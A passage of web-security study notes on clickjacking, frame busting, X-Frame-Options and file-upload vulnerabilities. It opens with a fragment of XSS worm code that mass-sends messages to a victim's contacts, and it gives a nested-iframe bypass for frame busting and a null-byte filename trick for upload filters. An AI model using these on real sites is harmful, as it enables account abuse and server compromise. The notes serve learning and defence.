    eval('msgimg'+x+'.src="http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn= "+URLEncoding(users[x].text)+"&co="+URLEncoding(evilonlinemsg)+"&vcodeinput=";'); 
  } 
}
Click Jacking/UI Redress Attack
Deceives users into interacting with disguised interface elements(e.g., buttons, links ) by overlaying hidden or transparent layers on legitimate web pages, so that victim 's clicks are unknowingly redirected to perform unintended actions.
Flash Click Jacking
Attacker made a Flash game and let user to click the button on the page. Each time they clicked, the position of the button would change.

添加图片注释，不超过 140 字（可选）

添加图片注释，不超过 140 字（可选）
Cross Site Image Overlaying(XSIO)
sven.vetsch adjusted the style of image, letting it cover any position on the page, such as logo.

添加图片注释，不超过 140 字（可选）

添加图片注释，不超过 140 字（可选）
Drag Hijacking and Data Theft

添加图片注释，不超过 140 字（可选）



Tap Jacking  

添加图片注释，不超过 140 字（可选）
How to defend?
Frame Busting
Use Javascript code to prohibit the nesting of iframe.
if (top != self)
if (top.location != self.location)
if (top.location != location)
if (parent.frames.length > 0)
if (window != top)
if (window.top !== window.self)
if (window.self != window.top)
if (parent && parent != window)
if (parent && parent.frames && parent.frames.length>0)
if((self.parent&&!(self.parent===self))&&(self.parent.frames.length!=0))
top.location = self.location
top.location.href = document.location.href
top.location.href = self.location.href
top.location.replace(self.location)
top.location.href = window.location.href
top.location.replace(document.location)
top.location.href = window.location.href
top.location.href = "URL"
document.write('')
top.location = location
top.location.replace(document.location)
top.location.replace('URL')
top.location.href = document.location
top.location.replace(window.location.href)
top.location.href = location.href
self.parent.location = document.location
parent.location.href = self.document.location
top.location.href = self.location
top.location = window.location
top.location.replace(window.location.pathname)
window.top.location = window.self.location
setTimeout(function(){document.body.innerHTML='';},1);
window.self.onload = function(evt){document.body.innerHTML='';}
var url = window.location.href; top.location.replace(url)
But this method can be bypassed using multiple iframes . For example:
if ( top.location != self.location) {
   parent.location = self.location ; 
}

// Bypass method
Attacker top frame:
<iframe src="attacker2 .html">
Attacker sub-frame:
<iframe src="http://www.victim.com">
In addition, there are many ways to restrict the execution of JavaScript , so that to  invalidate framebusting, such as sandbox in HTML5 iframe, security in IE.
X-Frame-Options
Supported browser:
IE 8+
Opera 10.50+
Safari 4+
Chrome 4.1.249.1042+
Firefox 3.6.9 (or earlier with NoScript)
DENY: Browser rejects to load any frame page
SAMEORIGIN: Browser only allows frame page under same origin domain
ALLOW-FROM: Browser allows which  origin domain 

## File Upload Vulnerability 
What makes file upload vulnerability?
The uploaded file could be interpreted and executed by the web container, that is, the directory where the file is uploaded should be covered by the web container.
Attackers/Users can access this uploaded file from website.
The content of the uploaded file is not altered by some functions, such as security checks, formatting, or image compression.
Common Bypass method
%00
xxx.php%00.jpg
Forge fake file header
Servers send the MIME Type(such as text/html or image/png) in the Content-Type HTTP header to tell browsers how to handle content.
However, if Content-Type is missing, wrong, or ambiguous, the browser will analyze the content itself(e.g., file headers, patterns) to guess the type. (This is called MIME Sniffing)
IE does not always follow the Content-Type header, prefers to MIME sniff based on the content more frequently.
Chrome/Safari follow the Content-Type, only when missing or wrong, they will check the first 256 bytes of the file content.
Firefox also follow the Content-Type, but if vague type(such as text/plain), it will check the first 512 bytes of the file content.

Common Vulnerabilities
CVE-2009-2265    
Name: FCKeditor File Upload Vulnerability
Affected systems: FCKeditor <=2.6.4.1 
CVE-2010-3971   
Name: CSS Memory Corruption Vulnerability/ CSS Parser Denial of Service
Number: MS11-003
Affected systems: Microsoft Internet Explorer 6.x/7.x/8.x
POC Environment: Windows7 Professional+ Microsoft Internet Explorer 

添加图片注释，不超过 140 字（可选）
Reference Books
《白帽子讲Web安全》作者：吴翰清
[^1]: https://blog.csdn.net/qq_74114417/article/details/144475186  
[^2]: https://blog.csdn.net/weixin_26722031/article/details/108136630  

  
## Recommended Tools
+ NodeJS(v20.18.0): https://nodejs.org/en/download  
+ npm(v10.8.2)  
+ PHPstudy is an integrated tool for running web page on personal computers. More info can be seen from website below:
https://www.xp.cn/php-study
